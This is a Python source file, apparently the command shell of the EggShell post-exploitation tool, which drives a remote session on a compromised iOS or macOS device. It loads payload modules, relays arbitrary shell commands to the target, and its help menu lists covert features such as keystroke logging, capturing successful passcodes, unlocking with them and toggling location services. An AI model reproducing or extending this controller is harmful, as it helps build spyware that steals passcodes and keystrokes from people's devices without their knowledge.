#ESShell
#created by lucas.py
#3-5-17
import os
import sys
from modules.helper.helper import Helper

class ESShell:
    def __init__(self):
        self.h = Helper()
        self.MODULES_MACOS = {}
        self.MODULES_MACOS_TEXT = {}
        self.MODULES_IOS = {}
        self.MODULES_IOS_TEXT = {}
        self.loadModules()
    
    def loadModules(self):
        MACOS_CMD_DESC = {}
        COMMANDS_MACOS = "modules/commands/macOS"
        COMMANDS_IOS = "modules/commands/iOS"
        sys.path.append(COMMANDS_MACOS)
        sys.path.append(COMMANDS_IOS)
        #get all modules in directory
        for module in os.listdir(COMMANDS_MACOS):
            if module == '__init__.py' or module[-3:] != '.py':
                continue
            m = __import__(module[:-3]).payload()
            #add module info to dictionary
            self.MODULES_MACOS_TEXT[m.id] = m.name
            self.MODULES_MACOS[m.name] = m
            del module
        for module in os.listdir(COMMANDS_IOS):
            if module == '__init__.py' or module[-3:] != '.py':
                continue
            m = __import__(module[:-3]).payload()
            #add module info to dictionary
            self.MODULES_IOS[m.name] = m
            self.MODULES_IOS_TEXT[m.id] = m.name
            del module

    def showHelp(self,CDA,multiserver):
        def showCommand(cmd,desc):
            print cmd + " " * (15 - len(cmd)) + ": " + desc
        print "\n"+self.h.WHITEBU+"Local Commands:"+"\n"+self.h.ENDC
        if multiserver:
            showCommand("back", "detach from session")
            showCommand("exit", "detach and close session")
        showCommand("lls","list contents of local directory")
        showCommand("lcd","change local directories")
        showCommand("lpwd","get current local directory")
        showCommand("lopen","open local directory")
        showCommand("clear","clears terminal")
        print ""
        if "i386" in CDA:
            print self.h.WHITEBU+"macOS Commands:"+"\n"+self.h.ENDC
            sorted = self.MODULES_MACOS_TEXT.keys()
            sorted.sort()
            for key in sorted:
                mod = self.MODULES_MACOS_TEXT[key]
                showCommand(mod,self.MODULES_MACOS[mod].description)
            print ""
        if "arm" in CDA:
            print self.h.WHITEBU+"iOS Commands:"+"\n"+self.h.ENDC
            sorted = self.MODULES_IOS_TEXT.keys()
            sorted.sort()
            for key in sorted:
                mod = self.MODULES_IOS_TEXT[key]
                showCommand(mod,self.MODULES_IOS[mod].description)
            #TODO: make these modules as well
            print "\n"+self.h.WHITEBU+"eggshellPro Commands:"+"\n"+self.h.ENDC
            showCommand("lock","simulate lock button press")
            showCommand("wake","wake device from sleeping state")
            showCommand("home","simulate home button press")
            showCommand("doublehome","simulate home button double press")
            showCommand("play","plays music")
            showCommand("lastapp","get bundle id of last app opened")
            showCommand("pause","pause music")
            showCommand("next","next track")
            showCommand("prev","previous track")
            showCommand("togglemute","programatically toggles silence switch")
            showCommand("ismuted","check if we are silenced or not")
            showCommand("islocked","check if device is locked") #there are ways to get around this, (alwaysunlock) tweak
            showCommand("getpasscode","log successfull passcode attempts")
            showCommand("unlock","unlock with passcode") #there are ways to get around this, (alwaysunlock) tweak
            showCommand("keylog","log keystrokes") #not working inside apps...yet
            showCommand("keylogclear","clear keylog data")
            showCommand("locationservice","turn on or off location services")
            print ""
    
    def interact(self,session,server,multiserver=0):
        self.h.strinfo("type \"help\" for commands")
        while 1:
            try:
                cmdraw = raw_input(session.name)
                if not cmdraw or cmdraw.replace(" ","") == "":
                    continue
            except KeyboardInterrupt:
                print ""
                return -1
        
            cmd = cmdraw.split()[0]
            arg = cmdraw[len(cmd) + 1:]
            
            #MARK: Local Command handling
            if cmd == "help":
                self.showHelp(session.CDA,multiserver)
            elif cmd == "clear":
                os.system(self.h.CMD_CLEAR);
            elif cmd == "lopen":
                if not arg:
                    print "Usage: lopen localdirectory"
                else:
                    if self.h.iswin:
                        print "Not supported on windows."
                    else:
                        os.system("open "+arg)
            elif cmd == "lls":
                os.system(self.h.CMD_LS + " " + arg)
            elif cmd == "lcd":
                if not arg:
                    print "Usage: lcd localdirectory/"
                    continue
                try:
                    os.chdir(arg)
                except:
                    self.h.strinfo("directory not found")
            elif cmd == "lpwd":
                os.system(self.h.CMD_PWD)
            elif cmd == "back" and multiserver:
                return
            elif cmd == "exit":
                return -1
            #MARK: Target command handling
            elif "arm" in session.CDA and cmd in self.MODULES_IOS:
                #tell module to execute()/prepare command
                command = self.MODULES_IOS[cmd].run(session,server,cmdraw)
                if command == "":
                    continue
                cmdtype = self.MODULES_IOS[cmd].type
                #send the return value
                result = server.sendCommand(command,arg,cmdtype,session.conn)
                if len(result) > 0:
                    print result
                continue
            elif "i386" in session.CDA and cmd in self.MODULES_MACOS:
                #tell module to execute()/prepare command
                command = self.MODULES_MACOS[cmd].run(session,server,cmdraw)
                if command == "":
                    continue
                cmdtype = self.MODULES_MACOS[cmd].type
                #send the return value
                result = server.sendCommand(command,arg,cmdtype,session.conn)
                if len(result) > 0:
                    print result
                continue
            else:
                result = server.sendCommand(cmd,arg,"shell",session.conn)
                if len(result) > 0:
                    print result

